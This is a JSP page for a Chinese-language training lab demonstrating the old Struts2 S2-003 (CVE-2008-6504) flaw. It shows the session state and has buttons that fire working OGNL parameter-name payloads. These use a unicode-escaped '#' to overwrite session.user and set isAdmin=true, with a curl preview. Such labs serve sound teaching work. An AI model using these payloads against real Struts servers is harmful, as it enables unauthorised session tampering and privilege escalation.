<%@ taglib prefix="s" uri="/struts-tags" %>
<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Struts2 S2-003 靶场</title>
    <style>
        body { margin: 0; font-family: "Helvetica Neue", "PingFang SC", sans-serif; background: #f5efe7; color: #1d2a35; }
        .wrap { max-width: 1040px; margin: 0 auto; padding: 28px 18px 40px; }
        .card { background: #fffdf8; border: 1px solid #d9ccb9; border-radius: 22px; padding: 24px; box-shadow: 0 16px 44px rgba(76, 51, 33, 0.08); margin-bottom: 18px; }
        .actions { display: flex; flex-wrap: wrap; gap: 10px; margin: 16px 0; }
        .preset-btn, .submit-btn { border: 0; border-radius: 999px; padding: 10px 16px; font-size: 14px; cursor: pointer; }
        .preset-btn { background: #e6f2ef; color: #155b52; }
        .submit-btn { background: #155b52; color: #fff; }
        .danger-btn { background: #7d271f; color: #fff; }
        .field { display: grid; gap: 8px; margin-top: 14px; }
        .field label { font-weight: 600; }
        .field textarea { min-height: 168px; resize: vertical; padding: 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; font: 14px/1.6 Consolas, monospace; color: #1d2a35; }
        .field input { padding: 12px 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; font: 14px/1.5 Consolas, monospace; color: #1d2a35; }
        a { color: #155b52; }
        code, pre { font-family: Consolas, monospace; }
        pre { background: #15202b; color: #e7eef7; padding: 14px; border-radius: 12px; white-space: pre-wrap; word-break: break-word; }
        .status { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 12px; }
        .status-item { background: #f8f1e7; border-radius: 16px; padding: 16px; border: 1px solid #eadcc8; }
        .ok { color: #155b52; font-weight: 600; }
        .warn { color: #7d271f; font-weight: 600; }
        p, li { line-height: 1.75; }
    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-003 演示靶场</h1>
        <p>这个模块用来演示 <code>S2-003 / CVE-2008-6504</code>：攻击者通过恶意参数名绕过 <code>#</code> 过滤，直接修改 Struts 的上下文对象。当前页面会把被污染的 session 值直接展示出来，方便你确认是否触发。</p>
    </div>
    <div class="card">
        <h2>当前状态</h2>
        <div class="status">
            <div class="status-item">
                <div>Session user</div>
                <div><code><s:property value="sessionUser"/></code></div>
            </div>
            <div class="status-item">
                <div>Session isAdmin</div>
                <div><code><s:property value="sessionAdmin"/></code></div>
            </div>
            <div class="status-item">
                <div>污染判定</div>
                <s:if test="manipulated">
                    <div class="warn">已观察到上下文污染</div>
                </s:if>
                <s:else>
                    <div class="ok">当前仍是干净状态</div>
                </s:else>
            </div>
        </div>
    </div>
    <div class="card">
        <h2>快捷测试</h2>
        <p>点击按钮后会直接向 <code>/index.action</code> 发送恶意参数名。默认 payload 来自官方公告示例，用来把 <code>#session.user</code> 改成你指定的值。</p>
        <div class="actions">
            <button type="button" class="preset-btn" onclick="runOfficialPayload()">执行官方 Payload</button>
            <button type="button" class="preset-btn" onclick="runAdminPayload()">设置 isAdmin=true</button>
            <button type="button" class="submit-btn" onclick="runCustomPayload()">执行当前自定义值</button>
            <button type="button" class="submit-btn danger-btn" onclick="location.href='reset.action'">清空 Session</button>
        </div>
        <div class="field">
            <label for="payloadValue">自定义写入值</label>
            <input id="payloadValue" value="0wn3d"/>
        </div>
        <div class="field">
            <label for="payloadBox">当前参数名 Payload</label>
            <textarea id="payloadBox" readonly></textarea>
        </div>
        <pre id="curlPreview"></pre>
    </div>
    <div class="card">
        <h2>说明</h2>
        <ol>
            <li>官方公告给出的典型利用是：<code>('\u0023' + 'session\'user\'')(unused)=0wn3d</code>。</li>
            <li>Struts 会把参数名当成 OGNL 路径处理，导致本页展示的 session 字段被直接修改。</li>
            <li>这个靶场采用 <code>Struts 2.0.11.2</code>，方便你观察 S2-003 的原始触发方式。</li>
        </ol>
    </div>
</div>
<script>
    function buildUrl(paramName, value) {
        return 'index.action?' + encodeURIComponent(paramName) + '=' + encodeURIComponent(value);
    }

    function setPreview(paramName, value) {
        document.getElementById('payloadBox').value = paramName + '=' + value;
        document.getElementById('curlPreview').textContent = 'curl -i "http://宿主机IP:9964/' + buildUrl(paramName, value) + '"';
    }

    function runPayload(paramName, value) {
        setPreview(paramName, value);
        location.href = buildUrl(paramName, value);
    }

    function runOfficialPayload() {
        const value = document.getElementById('payloadValue').value;
        runPayload("('\\u0023' + 'session\\'user\\'')(unused)", value);
    }

    function runAdminPayload() {
        runPayload("('\\u0023' + 'session[\\'isAdmin\\']')(unused)", 'true');
    }

    function runCustomPayload() {
        const value = document.getElementById('payloadValue').value;
        setPreview("('\\u0023' + 'session\\'user\\'')(unused)", value);
        location.href = buildUrl("('\\u0023' + 'session\\'user\\'')(unused)", value);
    }

    setPreview("('\\u0023' + 'session\\'user\\'')(unused)", document.getElementById('payloadValue').value);
</script>
</body>
</html>
